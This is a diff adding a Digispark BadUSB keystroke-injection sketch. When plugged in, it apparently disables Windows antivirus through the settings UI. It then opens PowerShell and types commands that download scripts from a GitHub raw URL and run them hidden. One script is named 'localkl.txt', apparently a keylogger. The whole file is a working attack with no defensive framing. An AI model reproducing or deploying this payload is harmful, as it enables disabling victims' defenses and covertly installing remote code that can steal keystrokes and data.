@@ -1,0 +1,137 @@
+#include "DigiKeyboard.h"
+
+void typeChar(uint8_t key, uint8_t mod = 0) {
+  DigiKeyboard.sendKeyStroke(key, mod);
+  DigiKeyboard.delay(100);
+}
+
+void setup() {
+  // put your setup code here, to run once:
+
+DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT  ); // press the windows key
+DigiKeyboard.delay(2000); // wait a second
+DigiKeyboard.print("anti");
+DigiKeyboard.delay(2000); // wait a second
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(2000); 
+DigiKeyboard.sendKeyStroke(43);
+DigiKeyboard.delay(100); // wait a second
+DigiKeyboard.sendKeyStroke(43);
+DigiKeyboard.delay(100); // wait a second
+DigiKeyboard.sendKeyStroke(43);
+DigiKeyboard.delay(100); // wait a second
+DigiKeyboard.sendKeyStroke(43);
+DigiKeyboard.delay(100); // wait a second
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(1200); // wait a second
+DigiKeyboard.sendKeyStroke(KEY_SPACE);
+DigiKeyboard.delay(1200); // wait a second
+DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+DigiKeyboard.delay(1200); // wait a second
+DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
+DigiKeyboard.delay(1200); // wait a second
+
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+  // Open Run (Win+R)
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  
+  // Launch PowerShell
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  
+  // Type the command using numeric keycodes:
+  DigiKeyboard.print("Invoke-WebRequest -Uri ");
+  
+  // https://
+  DigiKeyboard.print("https:");
+  typeChar(56); // Forward slash (/)
+  typeChar(56); // Second forward slash
+  
+  // raw.githubusercontent.com/...
+  DigiKeyboard.print("raw.githubusercontent.com");
+  typeChar(56); // /
+  DigiKeyboard.print("brunosmassa");
+  typeChar(56); // /
+  DigiKeyboard.print("lab");
+  typeChar(56); // /
+  DigiKeyboard.print("refs");
+  typeChar(56); // /
+  DigiKeyboard.print("heads");
+  typeChar(56); // /
+  DigiKeyboard.print("main");
+  typeChar(56); // /
+  DigiKeyboard.print("localkl.txt");
+  
+  // -OutFile .\massa.ps1
+  DigiKeyboard.print(" -OutFile ");
+  typeChar(55); // Period (.)
+  typeChar(49); // Backslash (\) - Keycode 49 for backslash
+  DigiKeyboard.print("massa.ps1");
+  
+  // | powershell .\massa.ps1
+  DigiKeyboard.print(" | powershell -windowstyle hidden ");
+  typeChar(55); // Period (.)
+  typeChar(49); // Backslash (\)
+  DigiKeyboard.print("massa.ps1");
+  
+  // Execute
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  
+  // Launch PowerShell
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+
+
+
+  // Loop to DC
+  DigiKeyboard.print("Invoke-WebRequest -Uri ");
+  
+  // https://
+  DigiKeyboard.print("https:");
+  typeChar(56); // Forward slash (/)
+  typeChar(56); // Second forward slash
+  
+  // raw.githubusercontent.com/...
+  DigiKeyboard.print("raw.githubusercontent.com");
+  typeChar(56); // /
+  DigiKeyboard.print("brunosmassa");
+  typeChar(56); // /
+  DigiKeyboard.print("lab");
+  typeChar(56); // /
+  DigiKeyboard.print("refs");
+  typeChar(56); // /
+  DigiKeyboard.print("heads");
+  typeChar(56); // /
+  DigiKeyboard.print("main");
+  typeChar(56); // /
+  DigiKeyboard.print("SentLoop");
+  
+  // -OutFile .\massa.ps1
+  DigiKeyboard.print(" -OutFile ");
+  typeChar(55); // Period (.)
+  typeChar(49); // Backslash (\) - Keycode 49 for backslash
+  DigiKeyboard.print("loop.ps1");
+  
+  // | powershell .\massa.ps1
+  DigiKeyboard.print(" | powershell -windowstyle hidden ");
+  typeChar(55); // Period (.)
+  typeChar(49); // Backslash (\)
+  DigiKeyboard.print("loop.ps1");
+  
+  // Execute
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  
+  // Stop further execution
+  for(;;) {}
+}
